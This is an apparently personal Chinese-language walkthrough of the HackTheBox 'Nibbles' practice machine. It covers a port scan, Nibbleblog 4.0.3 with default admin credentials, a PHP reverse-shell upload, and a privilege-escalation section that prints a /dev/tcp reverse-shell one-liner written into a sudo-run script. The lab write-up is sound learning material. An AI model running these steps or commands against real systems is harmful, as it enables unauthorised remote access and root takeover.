---
UID: 20250614221705
aliases: 
tags:
  - 打靶
  - 靶场
  - hackthebox
source: 
cssclasses: 
created: 2025-06-14
---

![image.png](https://s2.loli.net/2025/06/14/mT8KhDLfQ9REZlx.png)

## 扫描端口
![image.png](https://s2.loli.net/2025/06/14/IbxPFeKqh9sSTgX.png)

发现有个 22 端口和 80 端口

## 80 端口信息收集
打开页面一开始，是使用 dirsearch 和 feroxbuster 扫描。但感觉不对劲，没有出货

只能在主页面找找，看一下源码。找到路径了
![image.png](https://s2.loli.net/2025/06/14/vIfHAyrXZB736ex.png)

![image.png](https://s2.loli.net/2025/06/14/6LwTt3mpxarqflg.png)

查看 readme 知道版本号

![image.png](https://s2.loli.net/2025/06/14/RxQpNoG568rqtyn.png)

## 漏洞利用
搜索 nibbleblog 4.0.3 找到一个可以利用的漏洞。
![image.png](https://s2.loli.net/2025/06/14/XJ6o7vwLy1Az35C.png)

但需要找到账户密码，只能继续寻找，又发现一个

![image.png](https://s2.loli.net/2025/06/14/euDX6WE9G25Qdip.png)

苦苦寻找找到一个文件里面有说账户名是 admin
![image.png](https://s2.loli.net/2025/06/14/3RnhfdcXzGOox5T.png)


用 hydra 爆破一下密码。试了很多遍都没有用。只能想办法利用 my images 上传图片的漏洞

但貌似也要登录进去。

看了 wp，说是用了默认密码 admin/nibbles

![image.png](https://s2.loli.net/2025/06/14/Y3lqjwiodIKQCk1.png)

在 my_image 上传一个 php 反弹 shell 文件

![image.png](https://s2.loli.net/2025/06/15/YqhTVLe2yEoCRIF.png)

在这个目录中会变成 image. jpg，点一下就能反弹成功

![image.png](https://s2.loli.net/2025/06/15/oqwAOnMb3SKVhGi.png)


![image.png](https://s2.loli.net/2025/06/15/63KHiwoY4rFCm5x.png)

## 提权
![image.png](https://s2.loli.net/2025/06/15/6pbiofWB5SkNcOG.png)

找到第一个 flag

![image.png](https://s2.loli.net/2025/06/15/bSBLPKh3voqzrG8.png)

发现这个脚本可以不用密码执行 root 权限

修改一下这个脚本，改成反弹 shell

```
魔改
cat > monitor.sh <<EOF
#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.16.2/4242; sh <&196 >&196 2>&196
EOF
# 
```

![image.png](https://s2.loli.net/2025/06/15/rRxeflTiEJq8dAp.png)

![image.png](https://s2.loli.net/2025/06/15/blyju8h2LPFO7W4.png)

sudo 权限运行脚本，即可获得反弹 shell

![image.png](https://s2.loli.net/2025/06/15/uQtbUaoi75ZkMfx.png)
